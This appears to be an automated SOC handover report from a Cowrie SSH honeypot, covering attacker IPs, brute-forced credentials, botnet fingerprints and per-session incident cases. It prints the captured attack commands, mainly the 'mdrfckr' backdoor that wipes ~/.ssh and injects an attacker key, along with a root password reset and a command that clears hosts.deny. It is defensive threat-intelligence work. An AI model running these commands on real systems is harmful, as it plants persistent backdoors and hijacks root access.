# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-20 |
| **Generated At** | 2026-05-20T07:51:12Z |
| **Shift Time** | 07:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **665** |
| Confirmed Threats | **656** |
| False Positives Filtered | **9** (1.4%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **18** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **637** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **24** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 13 |
| `GET / HTTP/1.1` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 3 |
| `*1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |
| `$4` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Huawei_123` | `43.128.107.129` | 2026-05-20T05:47:28 |
| `root` | `3245gs5662d34` | `43.128.107.129` | 2026-05-20T05:47:31 |
| `root` | `Temp123` | `43.128.107.129` | 2026-05-20T05:52:40 |
| `root` | `weiwei` | `43.128.107.129` | 2026-05-20T05:53:58 |
| `root` | `123456qW` | `43.128.107.129` | 2026-05-20T05:55:13 |
| `root` | `123!@#asdASD` | `43.128.107.129` | 2026-05-20T05:56:32 |
| `root` | `0okm)OKM` | `43.128.107.129` | 2026-05-20T05:57:55 |
| `root` | `abcd.1234` | `103.171.69.114` | 2026-05-20T05:59:04 |
| `root` | `3245gs5662d34` | `103.171.69.114` | 2026-05-20T05:59:06 |
| `root` | `Aa666666` | `43.128.107.129` | 2026-05-20T05:59:19 |
| `root` | `Mr123456` | `180.252.147.44` | 2026-05-20T06:02:49 |
| `root` | `3245gs5662d34` | `180.252.147.44` | 2026-05-20T06:02:52 |
| `root` | `Admin#2026` | `171.25.158.70` | 2026-05-20T06:06:10 |
| `root` | `3245gs5662d34` | `171.25.158.70` | 2026-05-20T06:06:15 |
| `root` | `Admin#2026` | `209.99.189.174` | 2026-05-20T06:07:59 |
| `root` | `3245gs5662d34` | `209.99.189.174` | 2026-05-20T06:08:03 |
| `root` | `Yu123456` | `209.99.189.174` | 2026-05-20T06:08:33 |
| `root` | `root2023!@#` | `46.6.125.137` | 2026-05-20T07:06:12 |
| `root` | `aliali` | `46.6.125.137` | 2026-05-20T07:06:44 |
| `root` | `3245gs5662d34` | `46.6.125.137` | 2026-05-20T07:06:45 |
| `root` | `asu` | `46.6.125.137` | 2026-05-20T07:09:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **665** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 60 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 43 | 5 |
| `af8223ac9914...` | libssh-based | 16 | 2 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 43 | 5 | Mirai/variant |
| `af8223ac9914...` | libssh | 16 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pRU9eDo5ZrFq"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `46.6.125.137`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.171.69.114`, `171.25.158.70`, `209.99.189.174`, `46.6.125.137`, `180.252.147.44`, `43.128.107.129`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **23** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | MEDIUM |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS35100` | Patrik Lagerman | 1 | HIGH |
| `AS7418` | TELEFÓNICA CHILE S.A. | 1 | LOW |
| `AS15704` | XTRA TELECOM S.A. | 1 | HIGH |
| `AS398722` | Censys, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-777452daac55

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:47 |
| **Last Seen** | 2026-05-20 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:47:28` | `cowrie.session.connect` |
| `2026-05-20 05:47:28` | `cowrie.client.version` |
| `2026-05-20 05:47:28` | `cowrie.client.kex` |
| `2026-05-20 05:47:28` | `cowrie.login.success` |
| `2026-05-20 05:47:29` | `cowrie.session.params` |
| `2026-05-20 05:47:29` | `cowrie.command.input` |
| `2026-05-20 05:47:29` | `cowrie.command.failed` |
| `2026-05-20 05:47:29` | `cowrie.log.closed` |
| `2026-05-20 05:47:29` | `cowrie.session.params` |
| `2026-05-20 05:47:29` | `cowrie.command.input` |
| `2026-05-20 05:47:29` | `cowrie.session.file_download` |
| `2026-05-20 05:47:29` | `cowrie.log.closed` |
| `2026-05-20 05:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508e9db6b18c

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:47 |
| **Last Seen** | 2026-05-20 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:47:30` | `cowrie.session.connect` |
| `2026-05-20 05:47:30` | `cowrie.client.version` |
| `2026-05-20 05:47:30` | `cowrie.client.kex` |
| `2026-05-20 05:47:31` | `cowrie.login.success` |
| `2026-05-20 05:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc10ab0d2f6

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:52 |
| **Last Seen** | 2026-05-20 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:52:39` | `cowrie.session.connect` |
| `2026-05-20 05:52:39` | `cowrie.client.version` |
| `2026-05-20 05:52:40` | `cowrie.client.kex` |
| `2026-05-20 05:52:40` | `cowrie.login.success` |
| `2026-05-20 05:52:40` | `cowrie.session.params` |
| `2026-05-20 05:52:40` | `cowrie.command.input` |
| `2026-05-20 05:52:40` | `cowrie.command.failed` |
| `2026-05-20 05:52:40` | `cowrie.log.closed` |
| `2026-05-20 05:52:40` | `cowrie.session.params` |
| `2026-05-20 05:52:40` | `cowrie.command.input` |
| `2026-05-20 05:52:40` | `cowrie.session.file_download` |
| `2026-05-20 05:52:40` | `cowrie.log.closed` |
| `2026-05-20 05:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4b2c6218d6

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:52 |
| **Last Seen** | 2026-05-20 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:52:42` | `cowrie.session.connect` |
| `2026-05-20 05:52:42` | `cowrie.client.version` |
| `2026-05-20 05:52:42` | `cowrie.client.kex` |
| `2026-05-20 05:52:42` | `cowrie.login.success` |
| `2026-05-20 05:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43907fb18483

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:53 |
| **Last Seen** | 2026-05-20 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:53:57` | `cowrie.session.connect` |
| `2026-05-20 05:53:57` | `cowrie.client.version` |
| `2026-05-20 05:53:57` | `cowrie.client.kex` |
| `2026-05-20 05:53:58` | `cowrie.login.success` |
| `2026-05-20 05:53:58` | `cowrie.session.params` |
| `2026-05-20 05:53:58` | `cowrie.command.input` |
| `2026-05-20 05:53:58` | `cowrie.command.failed` |
| `2026-05-20 05:53:58` | `cowrie.log.closed` |
| `2026-05-20 05:53:58` | `cowrie.session.params` |
| `2026-05-20 05:53:58` | `cowrie.command.input` |
| `2026-05-20 05:53:58` | `cowrie.session.file_download` |
| `2026-05-20 05:53:58` | `cowrie.log.closed` |
| `2026-05-20 05:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb41f6abed4b

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:54 |
| **Last Seen** | 2026-05-20 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:54:00` | `cowrie.session.connect` |
| `2026-05-20 05:54:00` | `cowrie.client.version` |
| `2026-05-20 05:54:00` | `cowrie.client.kex` |
| `2026-05-20 05:54:00` | `cowrie.login.success` |
| `2026-05-20 05:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4606e2889c4d

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:55 |
| **Last Seen** | 2026-05-20 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:55:13` | `cowrie.session.connect` |
| `2026-05-20 05:55:13` | `cowrie.client.version` |
| `2026-05-20 05:55:13` | `cowrie.client.kex` |
| `2026-05-20 05:55:13` | `cowrie.login.success` |
| `2026-05-20 05:55:13` | `cowrie.session.params` |
| `2026-05-20 05:55:13` | `cowrie.command.input` |
| `2026-05-20 05:55:13` | `cowrie.command.failed` |
| `2026-05-20 05:55:13` | `cowrie.log.closed` |
| `2026-05-20 05:55:13` | `cowrie.session.params` |
| `2026-05-20 05:55:13` | `cowrie.command.input` |
| `2026-05-20 05:55:13` | `cowrie.session.file_download` |
| `2026-05-20 05:55:13` | `cowrie.log.closed` |
| `2026-05-20 05:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737956e29343

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:55 |
| **Last Seen** | 2026-05-20 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:55:15` | `cowrie.session.connect` |
| `2026-05-20 05:55:15` | `cowrie.client.version` |
| `2026-05-20 05:55:15` | `cowrie.client.kex` |
| `2026-05-20 05:55:15` | `cowrie.login.success` |
| `2026-05-20 05:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e531756666

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:56 |
| **Last Seen** | 2026-05-20 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:56:32` | `cowrie.session.connect` |
| `2026-05-20 05:56:32` | `cowrie.client.version` |
| `2026-05-20 05:56:32` | `cowrie.client.kex` |
| `2026-05-20 05:56:32` | `cowrie.login.success` |
| `2026-05-20 05:56:33` | `cowrie.session.params` |
| `2026-05-20 05:56:33` | `cowrie.command.input` |
| `2026-05-20 05:56:33` | `cowrie.command.failed` |
| `2026-05-20 05:56:33` | `cowrie.log.closed` |
| `2026-05-20 05:56:33` | `cowrie.session.params` |
| `2026-05-20 05:56:33` | `cowrie.command.input` |
| `2026-05-20 05:56:33` | `cowrie.session.file_download` |
| `2026-05-20 05:56:33` | `cowrie.log.closed` |
| `2026-05-20 05:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6c737aff81

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:56 |
| **Last Seen** | 2026-05-20 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:56:34` | `cowrie.session.connect` |
| `2026-05-20 05:56:34` | `cowrie.client.version` |
| `2026-05-20 05:56:34` | `cowrie.client.kex` |
| `2026-05-20 05:56:35` | `cowrie.login.success` |
| `2026-05-20 05:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1776e30b60

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:57 |
| **Last Seen** | 2026-05-20 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:57:54` | `cowrie.session.connect` |
| `2026-05-20 05:57:54` | `cowrie.client.version` |
| `2026-05-20 05:57:54` | `cowrie.client.kex` |
| `2026-05-20 05:57:55` | `cowrie.login.success` |
| `2026-05-20 05:57:55` | `cowrie.session.params` |
| `2026-05-20 05:57:55` | `cowrie.command.input` |
| `2026-05-20 05:57:55` | `cowrie.command.failed` |
| `2026-05-20 05:57:55` | `cowrie.log.closed` |
| `2026-05-20 05:57:55` | `cowrie.session.params` |
| `2026-05-20 05:57:55` | `cowrie.command.input` |
| `2026-05-20 05:57:55` | `cowrie.session.file_download` |
| `2026-05-20 05:57:55` | `cowrie.log.closed` |
| `2026-05-20 05:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.107[.]129` to AbuseIPDB if not already reported
- [ ] Block `43.128.107[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b772054f2a

| Field | Detail |
|---|---|
| **Source IP** | `43.128.107[.]129` |
| **First Seen** | 2026-05-20 05:57 |
| **Last Seen** | 2026-05-20 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 05:57:57` | `cowrie.session.connect` |
| `2026-05-20 05:57:57` | `cowrie.client.version` |
| `2026-05-20 05:57:57` | `cowrie.client.kex` |
| `2026-05-20 05:57:57` | `cowrie.login.success` |
